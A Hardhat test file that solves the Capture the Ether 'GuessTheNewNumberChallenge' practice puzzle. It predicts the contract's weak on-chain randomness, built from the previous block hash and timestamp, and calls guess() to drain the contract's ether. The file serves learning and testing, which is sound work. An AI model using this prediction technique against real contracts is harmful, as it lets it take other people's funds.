import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
    // uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    //Since we know the calculation to the Randomness we can get the same answer.

    // Get the block number and hash of the previous block, but being called in method so current block
   const blockNumber = await provider.getBlockNumber();
   const originalBlock = await provider.getBlock(blockNumber);
   const originalHash = originalBlock.hash;
   const originalTimestamp = originalBlock.timestamp + 1;
 
   // Calculate the answer using the same logic as in the contract
   const answer = ethers.utils.solidityKeccak256(
     ['bytes32', 'uint256'],
     [originalHash, originalTimestamp]
   );
 
   // Extract the last two hexadecimal digits and convert to decimal
   const lastTwoHexDigits = answer.slice(-2);
   const finalAnswer = parseInt(lastTwoHexDigits, 16);

   // Attempt to guess the number
   const tx = await target.guess(finalAnswer, {
     value: utils.parseEther('1'),
   });
 
   await tx.wait();

 
   expect(await provider.getBalance(target.address)).to.equal(0);
 });
});
